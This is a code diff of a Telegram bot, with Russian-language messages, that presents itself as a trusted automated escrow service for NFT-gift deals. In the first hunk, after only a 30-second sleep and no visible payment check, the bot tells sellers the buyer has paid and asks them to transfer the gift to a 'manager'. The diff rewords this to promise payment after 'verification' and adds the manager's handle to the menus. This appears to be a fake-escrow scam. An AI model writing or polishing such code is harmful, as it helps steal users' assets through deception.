@@ -117,7 +117,8 @@ async def cmd_start(message: types.Message, command: CommandObject):
                 await asyncio.sleep(30)
                 await bot.send_message(deal[1],
                     f"💰 Покупатель оплатил!\n"
-                    f"📦 Отправьте NFT-подарок менеджеру на проверку: {MANAGER_USERNAME}",
+                    f"📦 Переведите NFT-подарок менеджеру: {MANAGER_USERNAME}, "
+                    f"после проверки вам отправят деньги, а подарок будет отдан покупателю.",
                     reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                         [InlineKeyboardButton(text="✅ Подтвердить отправку подарка",
                                               callback_data=f"confirm_gift_{deal_id}")]
@@ -136,6 +137,7 @@ async def cmd_start(message: types.Message, command: CommandObject):
                 "✨ Надёжный сервис для безопасных сделок!\n\n"
                 "🚀 Автоматизировано, быстро и без лишних хлопот!\n\n"
                 "💎 Комиссия за услугу: 2%\n"
+                f"💎 Менеджер: {MANAGER_USERNAME}\n"
                 f"💎 Поддержка: {SUPPORT_USERNAME}\n\n"
                 "💌 Теперь ваши сделки под защитой!"
             ),
@@ -272,7 +274,11 @@ async def partner_program(call: types.CallbackQuery):
 # ---------- ПОДДЕРЖКА ----------
 @dp.callback_query(F.data == "support")
 async def support(call: types.CallbackQuery):
-    await call.message.edit_text(f"🆘 Поддержка: {SUPPORT_USERNAME}", reply_markup=back_to_main_btn())
+    await call.message.edit_text(
+        f"🆘 Поддержка: {SUPPORT_USERNAME}\n"
+        f"👤 Менеджер: {MANAGER_USERNAME}",
+        reply_markup=back_to_main_btn()
+    )
     await call.answer()
 
 # ---------- НАЗАД ----------
@@ -284,6 +290,7 @@ async def back_to_main(call: types.CallbackQuery, state: FSMContext):
         "✨ Надёжный сервис для безопасных сделок!\n\n"
         "🚀 Автоматизировано, быстро и без лишних хлопот!\n\n"
         "💎 Комиссия за услугу: 2%\n"
+        f"💎 Менеджер: {MANAGER_USERNAME}\n"
         f"💎 Поддержка: {SUPPORT_USERNAME}\n\n"
         "💌 Теперь ваши сделки под защитой!",
         reply_markup=main_menu()
